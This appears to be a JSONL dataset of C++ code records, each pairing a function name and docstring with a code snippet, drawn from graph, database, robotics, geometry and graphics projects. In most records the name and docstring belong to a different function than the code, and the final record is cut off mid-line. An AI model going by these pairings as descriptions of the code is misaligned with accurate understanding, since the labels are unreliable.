{"content":"{'function_name': 'scc', 'docstring': '\/\/every vertex is unvisited at the beginning', 'code': 'int main(){\\n\\n\\tint n, num,a;\\n\\tcin >>n;\\n\\tarr=new int[n+1];\\n\\n\\tfor(int i=1; i<n+1; i++){\\n\\t\\tarr[i]=0;\\n\\t}\\n\\t\/\/geting input and creating directed graph\\n\\tfor (int i=1; i <n+1 ; i ++){\\n\\t\\tcin >> num;\\n\\t\\tfor(int j=0; j<num; j++){\\n\\t\\t\\tcin>> a;\\n\\t\\t\\t\\n\\t\\t\\tif(graph.find(i)!=graph.end()){\\n\\t\\t\\t\\tmyVec = graph[i];\\n\\t\\t\\t\\tmyVec.push_back(a);\\n\\t\\t\\t}\\n\\t\\t\\telse{\\n\\t\\t\\t\\tmyVec.clear();\\n\\t\\t\\t\\tmyVec.push_back(a);\\n\\t\\t\\t}\\n\\t\\t\\tgraph[i]=myVec;\\n\\t\\t\\tif(inGraph.find(a)!=inGraph.end()){\\n\\t\\t\\t\\tmyVec = inGraph[a];\\n\\t\\t\\t\\tmyVec.push_back(i);\\n\\t\\t\\t}\\n\\t\\t\\telse{\\n\\t\\t\\t\\tmyVec.clear();\\n\\t\\t\\t\\tmyVec.push_back(i);\\n\\t\\t\\t}\\n\\t\\t\\tinGraph[a]=myVec;\\n\\n\\t\\t}\\n\\t}\\n\\t\/*for(auto sth: graph){\\n\\t\\tfor(int i=0; i < sth.second.size();i++){\\n\\t\\t\\tcout<<sth.first<<\" \"<<sth.second[i];\\n\\t\\t}\\n\\t\\tcout<<endl;\\n\\t}*\/\\n\\t\/\/done input!\\nbool flag=false, flag2=false;\\n\\tscc();\\n\\tint result=0,i;\\n\\tfor(auto a: count){\\n\\t\\tmap=count[a.first];\\n\\t\\tfor(auto b: map){\\n\\t\\t\\tmyVec=graph[b.first];\\n\\t\\t\\tfor( i=0; i<myVec.size(); i++){\\n\\t\\t\\t\\tif(myVec[i]==a.first){continue;};\\n\\t\\t\\n\\t\\t\\t\\tif((map).find(myVec[i])==map.end()){\\n\\t\\t\\t\\t\\tflag=true;\\t\\n\\t\\t\\t\\t\\tbreak;\\t\\t\\t\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t\\tif(flag==true){flag2=true; flag=false; break;}\\n\\t\\t}\\n\\t\\tif(flag2!=true){\\n\\t\\t\\tresult+=map.size();\\n\\t\\t}\\n\\t\\tflag2=false; \\n\\t}\\n\\t\/*for(auto a: count){\\n\\t\\tfor(auto b:count[a.first]){\\n\\t\\t\\tcout << a.first <<\" \" <<b.second<<\"\\\\n\";\\n\\t\\t}\\n\\t\\tcout<<endl;\\n\\t}*\/\\n\\tcout<<result<<\"\\\\n\";\\n\\n\\treturn 0;\\n}'}","id":2542}
{"content":"{'function_name': 'InitHtmlStrings', 'docstring': '\/\/ and uppercase equivs...', 'code': 'BOOL IsURLScheme(const char* Text)\\n{\\n\\tINT\\ti;\\n\\tINT\\tiVal;\\n\\n\\tif (!strchr(szSchemeStart, *Text)) \\n\\t\\treturn FALSE;\\n\\n\\t\/\/ ignore URL: prefix\\n\\tif (!strnicmp(Text,\"URL:\",4)) Text += 4;\\n\\n\/\/\\tint len = strlen(Text);\\n\\tint schemeLen = 0;\\n\\n\\tfor( i = szURLSchemes.GetUpperBound(); i >= 0; i-- )\\n\\t{\\n\\t\\tschemeLen = szURLSchemes[ i ].GetLength();\\n\\n\\t\\tif( ( iVal = strnicmp( szURLSchemes[ i ], Text, schemeLen) ) == 0 )\\n\\t\\t{\\n\/\/\\t\\t\\tif (len > schemeLen)\\n\\t\\t\\t\\treturn TRUE;\\n\/\/\\t\\t\\telse\\n\/\/\\t\\t\\t\\treturn FALSE;\\n\\t\\t}\\n\\t\\t\\n\\t\\tif( iVal < 0 )\\n\\t\\t{\\n\\t\\t\\treturn FALSE;\\n\\t\\t}\\n\\t}\\n\\t\\n\\treturn FALSE;\\n}'}","id":2543}
{"content":"{'function_name': 'load_map_file', 'docstring': '\/\/ extract the file extension', 'code': 'int ase_tmobject(const char * stream, model * m, geomobj * geom)\\n    {\\n        int result = 0;\\n\\n        \/\/ We transpose while loading the row major to get a column major\\n        while (ase_gettoken(stream, g_token))\\n        {\\n            sscanf(g_token, \"%s %s\",g_keyword, g_leftover);\\n            \/*\\n            if (!strcmp(g_keyword,tok_node_name))\\n            {\\n                const char * pStart = strchr(token, \\'\\\\\"\\');\\n            } \\n            else *\/\\n            if (!strcmp(g_keyword,tok_tm_row0))\\n            {\\n                sscanf(g_token, \"%s %f %f %f\",g_keyword, &geom->tm[0], &geom->tm[1], &geom->tm[2]);\\n            }\\n            else if (!strcmp(g_keyword,tok_tm_row1))\\n            {\\n                sscanf(g_token, \"%s %f %f %f\",g_keyword, &geom->tm[4], &geom->tm[5], &geom->tm[6]);\\n            }\\n            else if (!strcmp(g_keyword,tok_tm_row2))\\n            {\\n                sscanf(g_token, \"%s %f %f %f\",g_keyword, &geom->tm[8], &geom->tm[9], &geom->tm[10]);\\n            }\\n            else if (!strcmp(g_keyword,tok_tm_row3))\\n            {\\n                sscanf(g_token, \"%s %f %f %f\",g_keyword, &geom->tm[12], &geom->tm[13], &geom->tm[14]);\\n                geom->tm[12] *= g_scale_hack;\\n                geom->tm[13] *= g_scale_hack;\\n                geom->tm[14] *= g_scale_hack;\\n            }\\n            else if (!strcmp(g_keyword,tok_close))\\n            {\\n                geom->tm[3] = 0.0f;\\n                geom->tm[7] = 0.0f;\\n                geom->tm[11] = 0.0f;\\n                geom->tm[15] = 1.0f;\\n                \\n                \/\/ store the inverse...Assume this is a rigid body tm\\n                mat4 mat(geom->tm);\\n                mat4 invmat = inverse(mat);\\n                memcpy(geom->bone_offset_tm, invmat.mat_array ,sizeof(float) * 16);\\n                break;\\n            }\\n        }\\n        return result;\\n    }'}","id":2545}
{"content":"{'function_name': 'query_deserialize', 'docstring': \"\/\/ deserialization of 'serialized_buffer' failed.\", 'code': 'Status global_write_state_to_capnp(\\n    const Query& query,\\n    GlobalOrderWriter& global_writer,\\n    capnp::GlobalWriteState::Builder* state_builder,\\n    bool client_side) {\\n  auto& write_state = *global_writer.get_global_state();\\n\\n  auto& cells_written = write_state.cells_written_;\\n  if (!cells_written.empty()) {\\n    auto cells_written_builder = state_builder->initCellsWritten();\\n    auto entries_builder =\\n        cells_written_builder.initEntries(cells_written.size());\\n    uint64_t index = 0;\\n    for (auto& entry : cells_written) {\\n      entries_builder[index].setKey(entry.first);\\n      entries_builder[index].setValue(entry.second);\\n      ++index;\\n    }\\n  }\\n\\n  if (write_state.frag_meta_) {\\n    auto frag_meta = write_state.frag_meta_;\\n    auto frag_meta_builder = state_builder->initFragMeta();\\n    fragment_meta_sizes_offsets_to_capnp(*frag_meta, &frag_meta_builder);\\n    RETURN_NOT_OK(fragment_metadata_to_capnp(*frag_meta, &frag_meta_builder));\\n  }\\n\\n  if (write_state.last_cell_coords_.has_value()) {\\n    auto& single_coord = write_state.last_cell_coords_.value();\\n    auto coord_builder = state_builder->initLastCellCoords();\\n\\n    auto& coords = single_coord.get_coords();\\n    if (!coords.empty()) {\\n      auto builder = coord_builder.initCoords(coords.size());\\n      for (uint64_t i = 0; i < coords.size(); ++i) {\\n        builder.init(i, coords[i].size());\\n        for (uint64_t j = 0; j < coords[i].size(); ++j) {\\n          builder[i].set(j, coords[i][j]);\\n        }\\n      }\\n    }\\n    auto& sizes = single_coord.get_sizes();\\n    if (!sizes.empty()) {\\n      auto builder = coord_builder.initSizes(sizes.size());\\n      for (uint64_t i = 0; i < sizes.size(); ++i) {\\n        builder.set(i, sizes[i]);\\n      }\\n    }\\n    auto& single_offset = single_coord.get_single_offset();\\n    if (!single_offset.empty()) {\\n      auto builder = coord_builder.initSingleOffset(single_offset.size());\\n      for (uint64_t i = 0; i < single_offset.size(); ++i) {\\n        builder.set(i, single_offset[i]);\\n      }\\n    }\\n  }\\n\\n  state_builder->setLastHilbertValue(write_state.last_hilbert_value_);\\n\\n  \/\/ Serialize the multipart upload state\\n  auto&& [st, multipart_states] =\\n      global_writer.multipart_upload_state(client_side);\\n  RETURN_NOT_OK(st);\\n\\n  if (!multipart_states.empty()) {\\n    auto multipart_builder = state_builder->initMultiPartUploadStates();\\n    auto entries_builder =\\n        multipart_builder.initEntries(multipart_states.size());\\n    uint64_t index = 0;\\n    for (auto& entry : multipart_states) {\\n      entries_builder[index].setKey(entry.first);\\n      auto multipart_entry_builder = entries_builder[index].initValue();\\n      ++index;\\n      auto& state = entry.second;\\n      multipart_entry_builder.setPartNumber(state.part_number);\\n      if (state.upload_id.has_value()) {\\n        multipart_entry_builder.setUploadId(*state.upload_id);\\n      }\\n      if (!state.status.ok()) {\\n        multipart_entry_builder.setStatus(state.status.message());\\n      }\\n\\n      auto& completed_parts = state.completed_parts;\\n      \/\/ Get completed parts\\n      if (!completed_parts.empty()) {\\n        auto builder = multipart_entry_builder.initCompletedParts(\\n            state.completed_parts.size());\\n        for (uint64_t i = 0; i < state.completed_parts.size(); ++i) {\\n          if (state.completed_parts[i].e_tag.has_value()) {\\n            builder[i].setETag(*state.completed_parts[i].e_tag);\\n          }\\n          builder[i].setPartNumber(state.completed_parts[i].part_number);\\n        }\\n      }\\n\\n      if (state.buffered_chunks.has_value()) {\\n        auto& buffered_chunks = state.buffered_chunks.value();\\n        auto builder =\\n            multipart_entry_builder.initBufferedChunks(buffered_chunks.size());\\n        for (uint64_t i = 0; i < buffered_chunks.size(); ++i) {\\n          builder[i].setUri(buffered_chunks[i].uri);\\n          builder[i].setSize(buffered_chunks[i].size);\\n        }\\n      }\\n    }\\n  }\\n\\n  return Status::Ok();\\n}'}","id":2554}
{"content":"{'function_name': 'handle_signal', 'docstring': '\/\/ do nothing, ignore SIGHUP, SIGTERM', 'code': 'int req_parser(std::string request, std::string* pth, std::string* cgi = NULL) {\\n    \\n    std::string index;\\n    char *t, *path, *cgi_query;\\n    std::string path2;\\n    \\n    pth->erase();\\n    \\n    size_t pos = request.find(\\' \\',0);\\n    if(pos > 0 && \"GET\" == request.substr(0,pos)){\\n        size_t posf = request.find(\\' \\',pos+1);\\n        path2 = request.substr(pos+1+1,posf-pos-1-1);\\n        pos = path2.find(\\'?\\',0);\\n        if(pos!=-1)\\n            path2 = path2.substr(0,path2.find(\\'?\\',0));\\n    }    \\n\\n\/\/    istringstream iss(d4);\\n\/\/    do {\\n\/\/        string sub;\\n\/\/        iss >> sub;\\n\/\/        if (sub == \"GET\"){\\n\/\/            iss >> index;\\n\/\/            break;\\n\/\/        }\\n\/\/    } while(iss);\\n    \\n    if (path2.empty())\\n        index = \"index.html\";\\n    else\\n        index.assign(path2);\\n\\n    if ( ! WORKDIR.empty()){\\n        pth->assign(WORKDIR);\\n        pth->append(\"\/\/\");\\n    }\\n    pth->append(index);\\n\\n    return 0;\\n}'}","id":2556}
{"content":"{'function_name': 'p_gda_knn_weights', 'docstring': '\/\/ invoke the function', 'code': 'SEXP p_gda_kernel_knn_weights(SEXP xp_geoda, int k, double power, bool is_inverse, bool is_arc, bool is_mile, std::string kernel_method, double bandwidth, bool adaptive_bandwidth, bool use_kernel_diagonals)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDa\\n  Rcpp::XPtr<GeoDa> ptr(xp_geoda);\\n  GeoDa* geoda = static_cast<GeoDa*> (R_ExternalPtrAddr(ptr));\\n\\n  \/\/ invoke the function\\n  GeoDaWeight* w = gda_knn_weights(geoda, k, power, is_inverse, is_arc, is_mile, kernel_method, 0, adaptive_bandwidth, use_kernel_diagonals, \"\");\\n\\n  Rcpp::XPtr<GeoDaWeight> w_ptr(w, true);\\n  return w_ptr;\\n}'}","id":2564}
{"content":"{'function_name': 'reciprocal', 'docstring': '\/\/return reciprocal', 'code': 'int main(){\\n  list<double> vals;\\n  int i;\\n  \/\/put valuees into list\\n  for(i=0;i<10;i++) vals.push_back(i);\\n\\n  cout<<\"Original contents of vals: \\\\n\";\\n  list<double>::iterator p=vals.begin();\\n  while(p!=vals.end()){\\n    cout<<*p<<\" \";\\n    p++;\\n  }\\n  cout<<endl;\\n\\n  \/\/transform vals\\n  p=transform(vals.begin(),vals.end(),\\n\\t      vals.begin(),reciprocal);\\n\\n  cout<<\"Transformed contents of vals:\\\\n\";\\n  p=vals.begin();\\n  while(p!=vals.end()){\\n    cout<<*p<<\" \";\\n    p++;\\n  }\\n  cout<<endl;\\n  return 0;\\n}'}","id":2565}
{"content":"{'function_name': 'InitDBDbfilehdr', 'docstring': '\/\/  Never changing point in time, the subsequent attach \/ the SetDbVer LRs will then upgrade.', 'code': \"ERR ErrDBParseDbParams(\\n    _In_reads_opt_( csetdbparam )const JET_SETDBPARAM* const    rgsetdbparam,\\n    _In_ const ULONG                                            csetdbparam,\\n    _Out_opt_ CPG* const                                        pcpgDatabaseSizeMax,            \/\/ JET_dbparamDbSizeMaxPages\\n    _Out_opt_ ULONG* const                                      ppctCachePriority,              \/\/ JET_dbparamCachePriority\\n    _Out_opt_ JET_GRBIT* const                                  pgrbitShrinkDatabaseOptions,    \/\/ JET_dbparamShrinkDatabaseOptions\\n    _Out_opt_ LONG* const                                       pdtickShrinkDatabaseTimeQuota,  \/\/ JET_dbparamShrinkDatabaseTimeQuota\\n    _Out_opt_ CPG* const                                        pcpgShrinkDatabaseSizeLimit,    \/\/ JET_dbparamShrinkDatabaseSizeLimit\\n    _Out_opt_ BOOL* const                                       pfLeakReclaimerEnabled,         \/\/ JET_dbparamLeakReclaimerEnabled\\n    _Out_opt_ LONG* const                                       pdtickLeakReclaimerTimeQuota )  \/\/ JET_dbparamLeakReclaimerTimeQuota\\n{\\n    if ( ( rgsetdbparam == NULL ) && ( csetdbparam > 0 ) )\\n    {\\n        return ErrERRCheck( JET_errInvalidParameter );\\n    }\\n\\n    Expected( ( csetdbparam > 0 ) || ( rgsetdbparam == NULL ) );    \/\/ Why would you have a valid pointer and no elements to process?\\n\\n    \/\/\\n    \/\/ Set all Db parameter defaults.\\n    \/\/\\n\\n    if ( pcpgDatabaseSizeMax != NULL )\\n    {\\n        *pcpgDatabaseSizeMax = 0;\\n    }\\n\\n    if ( ppctCachePriority != NULL )\\n    {\\n        *ppctCachePriority = g_pctCachePriorityUnassigned;\\n    }\\n\\n    if ( pgrbitShrinkDatabaseOptions != NULL )\\n    {\\n#ifdef DEBUG\\n        *pgrbitShrinkDatabaseOptions = JET_bitShrinkDatabaseEofOnAttach;\\n#else\\n        *pgrbitShrinkDatabaseOptions = NO_GRBIT;\\n#endif\\n    }\\n\\n    if ( pdtickShrinkDatabaseTimeQuota != NULL )\\n    {\\n        *pdtickShrinkDatabaseTimeQuota = -1;\\n    }\\n\\n    if ( pcpgShrinkDatabaseSizeLimit != NULL )\\n    {\\n        *pcpgShrinkDatabaseSizeLimit = 0;\\n    }\\n\\n    if ( pfLeakReclaimerEnabled != NULL )\\n    {\\n        *pfLeakReclaimerEnabled = fFalse;\\n    }\\n\\n    if ( pdtickLeakReclaimerTimeQuota != NULL )\\n    {\\n        *pdtickLeakReclaimerTimeQuota = -1;\\n    }\\n\\n    \/\/\\n    \/\/ Go through the array of DB parameters and collect all user inputs.\\n    \/\/\\n\\n    for ( ULONG isetdbparam = 0; isetdbparam < csetdbparam; isetdbparam++ )\\n    {\\n        const ULONG dbparamid = rgsetdbparam[ isetdbparam ].dbparamid;\\n        const void* const pvParam = rgsetdbparam[ isetdbparam ].pvParam;\\n        const ULONG cbParam = rgsetdbparam[ isetdbparam ].cbParam;\\n        void* pvParamDest = NULL;\\n        ULONG cbParamDest = 0;\\n\\n        \/\/ Collect size and memory location of each user input.\\n        switch ( dbparamid )\\n        {\\n            case JET_dbparamDbSizeMaxPages:\\n                cbParamDest = sizeof( *pcpgDatabaseSizeMax );\\n                pvParamDest = pcpgDatabaseSizeMax;\\n                break;\\n\\n            case JET_dbparamCachePriority:\\n                cbParamDest = sizeof( *ppctCachePriority );\\n                pvParamDest = ppctCachePriority;\\n                break;\\n\\n            case JET_dbparamShrinkDatabaseOptions:\\n                cbParamDest = sizeof( *pgrbitShrinkDatabaseOptions );\\n                pvParamDest = pgrbitShrinkDatabaseOptions;\\n                break;\\n\\n            case JET_dbparamShrinkDatabaseTimeQuota:\\n                cbParamDest = sizeof( *pdtickShrinkDatabaseTimeQuota );\\n                pvParamDest = pdtickShrinkDatabaseTimeQuota;\\n                break;\\n\\n            case JET_dbparamShrinkDatabaseSizeLimit:\\n                cbParamDest = sizeof( *pcpgShrinkDatabaseSizeLimit );\\n                pvParamDest = pcpgShrinkDatabaseSizeLimit;\\n                break;\\n\\n            case JET_dbparamLeakReclaimerEnabled:\\n                cbParamDest = sizeof( *pfLeakReclaimerEnabled );\\n                pvParamDest = pfLeakReclaimerEnabled;\\n                break;\\n\\n            case JET_dbparamLeakReclaimerTimeQuota:\\n                cbParamDest = sizeof( *pdtickLeakReclaimerTimeQuota );\\n                pvParamDest = pdtickLeakReclaimerTimeQuota;\\n                break;\\n\\n            default:\\n                Expected( ( dbparamid >= JET_dbparamDbSizeMaxPages ) \/* min value *\/ && ( dbparamid < ( JET_dbparamDbSizeMaxPages + 1024 ) ) ); \/\/ or they're passing a sysparam or sesparam?\\n                return ErrERRCheck( JET_errInvalidDbparamId );\\n        }\\n\\n        \/\/\\n        \/\/ Validates size and pointers.\\n        \/\/\\n\\n        \/\/ Caller is not expecting this parameter, do nothing.\\n        if ( pvParamDest == NULL )\\n        {\\n            continue;\\n        }\\n\\n        \/\/ Size mismatches.\\n        if ( cbParam != cbParamDest )\\n        {\\n            return ErrERRCheck( JET_errInvalidBufferSize );\\n        }\\n\\n        \/\/ Invalid pointer.\\n        if ( ( pvParam == NULL ) && ( cbParam > 0 ) )\\n        {\\n            return ErrERRCheck( JET_errInvalidBufferSize );\\n        }\\n\\n        Expected( ( cbParam > 0 ) || ( pvParam == NULL ) ); \/\/ Why would you have a valid pointer and no bytes to copy?\\n\\n        \/\/\\n        \/\/ Finally, copy the data.\\n        \/\/\\n\\n        if ( cbParam > 0 )\\n        {\\n            Assert( ( pvParamDest != NULL ) && ( pvParam != NULL ) );\\n            Assert( cbParam == cbParamDest );\\n            UtilMemCpy( pvParamDest, pvParam, cbParamDest );\\n        }\\n    }\\n\\n    \/\/\\n    \/\/ Validate individual parameters.\\n    \/\/\\n\\n    \/\/ JET_dbparamCachePriority.\\n    if ( ( ppctCachePriority != NULL ) &&\\n            FIsCachePriorityAssigned( *ppctCachePriority ) &&\\n            !FIsCachePriorityValid( *ppctCachePriority ) )\\n    {\\n        return ErrERRCheck( JET_errInvalidParameter );\\n    }\\n\\n    \/\/ JET_dbparamShrinkDatabaseOptions.\\n    if ( ( pgrbitShrinkDatabaseOptions != NULL ) &&\\n        ( ( *pgrbitShrinkDatabaseOptions &\\n          ~( JET_bitShrinkDatabaseEofOnAttach |\\n             JET_bitShrinkDatabaseFullCategorizationOnAttach |\\n             JET_bitShrinkDatabaseDontMoveRootsOnAttach |\\n             JET_bitShrinkDatabaseDontTruncateLeakedPagesOnAttach |\\n             JET_bitShrinkDatabaseDontTruncateIndeterminatePagesOnAttach ) ) != 0 ) )\\n    {\\n        return ErrERRCheck( JET_errInvalidGrbit );\\n    }\\n\\n    \/\/ JET_dbparamShrinkDatabaseTimeQuota.\\n    if ( ( pdtickShrinkDatabaseTimeQuota != NULL ) &&\\n            ( *pdtickShrinkDatabaseTimeQuota > ( 7 * 24 * 60 * 60 * 1000 ) ) &&\\n            ( *pdtickShrinkDatabaseTimeQuota != -1 ) )\\n    {\\n        return ErrERRCheck( JET_errInvalidParameter );\\n    }\\n\\n    \/\/ JET_dbparamLeakReclaimerTimeQuota.\\n    if ( ( pdtickLeakReclaimerTimeQuota != NULL ) &&\\n            ( *pdtickLeakReclaimerTimeQuota > ( 7 * 24 * 60 * 60 * 1000 ) ) &&\\n            ( *pdtickLeakReclaimerTimeQuota != -1 ) )\\n    {\\n        return ErrERRCheck( JET_errInvalidParameter );\\n    }\\n\\n    \/\/ JET_dbparamShrinkDatabaseSizeLimit.\\n    if ( ( pcpgShrinkDatabaseSizeLimit != NULL ) && ( *pcpgShrinkDatabaseSizeLimit < 0 ) )\\n    {\\n        return ErrERRCheck( JET_errInvalidParameter );\\n    }\\n\\n    return JET_errSuccess;\\n}\"}","id":2567}
{"content":"{'function_name': 'detectGrasp', 'docstring': '\/\/publish the Grasp message -> real output of interest', 'code': 'int main (int argc, char **argv)\\n{\\n  ROS_INFO(\"ROS NODE calc_grasppoints_client_simulation started\");\\n  ros::init(argc, argv, \"calc_grasppoints_client_sim\");\\n  nh_pointer = new(ros::NodeHandle);\\n\\n  \/\/ parsers -----------\\n  nh_pointer->param(\"input_topic_haf\",input_topic,INPUT_TOPIC);\\n  std::cout << \"\\\\n\\\\ninput topic: \" << input_topic << \"\\\\n\\\\n\";\\n\\n  nh_pointer->param(\"opening_width_scale_marker\",opening_width_scale,OPENING_WIDTH_SCALE);\\n  std::cout << \"opening_width_scale: \" << opening_width_scale << \"\\\\n\";  \\n\\n  nh_pointer->param(\"base_frame\", base_frame, BASE_FRAME);\\n  \/\/--------------------\\n\\n  \/\/ subscriber - input topic\\n  ros::Subscriber sub = nh_pointer->subscribe<sensor_msgs::PointCloud2>(input_topic, 1,detectGrasp);\\n  \\n  \/\/ publishers\\n  grasp_poses_pub = nh_pointer->advertise<geometry_msgs::PoseArray>(\"haf_grasping\/grasp_poses\",1);\\n  grasp_poses_closing_direction_pub = nh_pointer->advertise<visualization_msgs::MarkerArray>(\"haf_grasping\/grasp_poses_closing_direction\",1);\\n  grasp_poses_approaching_direction_pub = nh_pointer->advertise<visualization_msgs::MarkerArray>(\"haf_grasping\/grasp_poses_approaching_direction\",1);\\n  grasps_data_pub = nh_pointer->advertise<haf_grasping::Grasps>(\"haf_grasping\/grasps_data\",1);\\n  segmented_objects_pub = nh_pointer->advertise<sensor_msgs::PointCloud2>(\"\/segmented_objects\/points\",1);\\n\\n  \/\/ client - for the object segmentation\\n  client = nh_pointer->serviceClient<iri_tos_supervoxels::object_segmentation>(\"\/iri_tos_supervoxels_alg\/object_segmentation\");\\n\\n  \/\/ pointer to TransformListener\\n  pListener = new (tf::TransformListener);\\n\\n  ros::spin();\\n  return 0;\\n}'}","id":2571}
{"content":"{'function_name': 'clockwise', 'docstring': '\/\/k1 k2 k3 \u9006\u65f6\u9488 1 \u987a\u65f6\u9488 -1 \u5426\u5219 0', 'code': 'int contain(vector<point>A,point q){\\n\\t\/\/2 \u5185\u90e8 1 \u8fb9\u754c 0 \u5916\u90e8\\n\\tA.push_back(A[0]); int pd=0;\\n\\tfor (int i=1;i<A.size();i++){\\n\\t\\tpoint u=A[i-1],v=A[i];\\n\\t\\tif (onS(u,v,q)) return 1;\\n\\t\\tif (cmp(u.y,v.y)>0) swap(u,v);\\n\\t\\tif (cmp(u.y,q.y)>=0||cmp(v.y,q.y)<0) continue;\\n\\t\\tif (sign(cross(u-v,q-v))<0) pd^=1;\\n\\t}\\n\\treturn pd<<1;\\n}'}","id":2572}
{"content":"{'function_name': 'ImageRecvThread', 'docstring': '\/*\\n\\t\\tImage recv \ud558\ub294\uac70 \uc774\ubd80\ubd84\uc73c\ub85c \ubd84\ub9ac\ud574\uc11c \uc801\uc6a9\\n\\t\\tbut, \uc774\ubbf8\uc9c0 \ubc1b\ub294\uac70\ub791 \ubfcc\ub9ac\ub294\uac70\ub791 \uc2f1\ud06c\uac00 \ub9de\uc744\uae4c?\\n\\t*\/', 'code': 'Mat drawBackgroundVectorscope(Mat img, int width, int height){\\n\\tScalar color(0, 128, 255); \/\/RGB(255, 128, 0)\\n\\tScalar color2(0x3a, 0x5f, 0xa6); \/\/RGB(255, 128, 0)\\n\\n\\tint w2 = width \/ 2;\\n\\tint h2 = height \/ 2;\\n\\tint thickness = 1;\\n\\tfloat c1 = ((float)20 \/ 256) * width; \/\/ Circle1\\n\\tfloat c2 = ((float)40 \/ 256) * width; \/\/ Circle2\\n\\tfloat c3 = ((float)60 \/ 256) * width; \/\/ Circle3\\n\\tfloat c4 = ((float)80 \/ 256) * width; \/\/ Circle4\\n\\tfloat c5 = ((float)100 \/ 256) * width; \/\/ Circle5\\n\\n\\t\/\/line(img, Point(w2 - 5, h2), Point(w2 + 5, h2), color, thickness);\\t\/\/ Horizontal\\n\\t\/\/line(img, Point(w2, h2 - 5), Point(w2, h2 + 5), color, thickness);\\t\/\/ Vertical\\n\\n\\t\/\/ Horizontal\\n\\tline(img, Point(VECTORSCOPE_INTERVAL, h2), Point(w2 - 15, h2), color, thickness);\\n\\tline(img, Point(w2 + 15, h2), Point(width - VECTORSCOPE_INTERVAL, h2), color, thickness);\\n\\tline(img, Point(w2 - 5, h2), Point(w2 + 5, h2), color, thickness);\\n\\t\/\/ Vertical\\n\\tline(img, Point(w2, VECTORSCOPE_INTERVAL), Point(w2, h2 - 15), color, thickness);\\n\\tline(img, Point(w2, h2 + 15), Point(w2, height - VECTORSCOPE_INTERVAL), color, thickness);\\n\\tline(img, Point(w2, h2 - 5), Point(w2, h2 + 5), color, thickness);\\n\\n\\t\/\/ Circle\\n\\tcircle(img, Point(w2, h2), (int)c1, color, thickness, CV_AA);\\n\\tcircle(img, Point(w2, h2), (int)c2, color, thickness, CV_AA);\\n\\tcircle(img, Point(w2, h2), (int)c3, color, thickness, CV_AA);\\n\\tcircle(img, Point(w2, h2), (int)c4, color, thickness, CV_AA);\\n\\tcircle(img, Point(w2, h2), (int)c5, color, thickness, CV_AA);\\n\\n#if 0\\n\\tdouble cos30 = cos(ToRadian(30));\\n\\tdouble cos60 = cos(ToRadian(60));\\n\\tdouble sin30 = sin(ToRadian(30));\\n\\tdouble sin60 = sin(ToRadian(60));\\n\\tline(img, Point(w2 + (c1 * cos30), h2 - (c1 * sin30)), Point(w2 + (c5 * cos30), h2 - (c5 * sin30)), color2, thickness, CV_AA); \/\/ \uc6b0\uc0c1\ub2e8 \uc544\ub798\ucabd\\n\\tline(img, Point(w2 - (c1 * cos30), h2 - (c1 * sin30)), Point(w2 - (c5 * cos30), h2 - (c5 * sin30)), color2, thickness, CV_AA); \/\/ \uc88c\uc0c1\ub2e8 \uc544\ub798\ucabd\\n\\tline(img, Point(w2 + (c1 * cos60), h2 - (c1 * sin60)), Point(w2 + (c5 * cos60), h2 - (c5 * sin60)), color2, thickness, CV_AA); \/\/ \uc6b0\uc0c1\ub2e8 \uc704\ucabd\\n\\tline(img, Point(w2 - (c1 * cos60), h2 - (c1 * sin60)), Point(w2 - (c5 * cos60), h2 - (c5 * sin60)), color2, thickness, CV_AA); \/\/ \uc88c\uc0c1\ub2e8 \uc704\ucabd\\n\\tline(img, Point(w2 + (c1 * cos30), h2 + (c1 * sin30)), Point(w2 + (c5 * cos30), h2 + (c5 * sin30)), color2, thickness, CV_AA);\\n\\tline(img, Point(w2 - (c1 * cos30), h2 + (c1 * sin30)), Point(w2 - (c5 * cos30), h2 + (c5 * sin30)), color2, thickness, CV_AA);\\n\\tline(img, Point(w2 + (c1 * cos60), h2 + (c1 * sin60)), Point(w2 + (c5 * cos60), h2 + (c5 * sin60)), color2, thickness, CV_AA);\\n\\tline(img, Point(w2 - (c1 * cos60), h2 + (c1 * sin60)), Point(w2 - (c5 * cos60), h2 + (c5 * sin60)), color2, thickness, CV_AA);\\n#else\\n\\tdouble cos0 = cos(ToRadian(COLOR_DEGREE[0]));\\n\\tdouble sin0 = sin(ToRadian(COLOR_DEGREE[0]));\\n\\tdouble cos1 = cos(ToRadian(COLOR_DEGREE[1]));\\n\\tdouble sin1 = sin(ToRadian(COLOR_DEGREE[1]));\\n\\tdouble cos2 = cos(ToRadian(COLOR_DEGREE[2]));\\n\\tdouble sin2 = sin(ToRadian(COLOR_DEGREE[2]));\\n\\tdouble cos3 = cos(ToRadian(COLOR_DEGREE[3]));\\n\\tdouble sin3 = sin(ToRadian(COLOR_DEGREE[3]));\\n\\tdouble cos4 = cos(ToRadian(COLOR_DEGREE[4]));\\n\\tdouble sin4 = sin(ToRadian(COLOR_DEGREE[4]));\\n\\tdouble cos5 = cos(ToRadian(COLOR_DEGREE[5]));\\n\\tdouble sin5 = sin(ToRadian(COLOR_DEGREE[5]));\\n\\tline(img, Point(w2 + (c1 * cos0), h2 - (c1 * sin0)), Point(w2 + (c5 * cos0), h2 - (c5 * sin0)), color2, thickness, CV_AA); \/\/ Mg\\n\\tline(img, Point(w2 + (c1 * cos1), h2 - (c1 * sin1)), Point(w2 + (c5 * cos1), h2 - (c5 * sin1)), color2, thickness, CV_AA); \/\/ R\\n\\tline(img, Point(w2 + (c1 * cos2), h2 - (c1 * sin2)), Point(w2 + (c5 * cos2), h2 - (c5 * sin2)), color2, thickness, CV_AA); \/\/ Y\\n\\tline(img, Point(w2 + (c1 * cos3), h2 - (c1 * sin3)), Point(w2 + (c5 * cos3), h2 - (c5 * sin3)), color2, thickness, CV_AA); \/\/ G\\n\\tline(img, Point(w2 + (c1 * cos4), h2 - (c1 * sin4)), Point(w2 + (c5 * cos4), h2 - (c5 * sin4)), color2, thickness, CV_AA); \/\/ Cy\\n\\tline(img, Point(w2 + (c1 * cos5), h2 - (c1 * sin5)), Point(w2 + (c5 * cos5), h2 - (c5 * sin5)), color2, thickness, CV_AA); \/\/ B\\n#endif\\n\\n\\tfloat dRadian;\\n\\tint x, y;\\n\\tfor (int i = 0; i < VECTORSCOPE_COLOR_POINT; i++) {\\n\\t\\tdRadian = ToRadian(-COLOR_DEGREE[i]);\\n\\t\\tx = (int)(COLOR_SCALE[i] * w2 * cos(dRadian));\\n\\t\\ty = (int)(COLOR_SCALE[i] * h2 * sin(dRadian));\\n\\n\\t\\t\/\/ \ud3c9\ud589\uc774\ub3d9\\n\\t\\tx += w2;\\n\\t\\ty 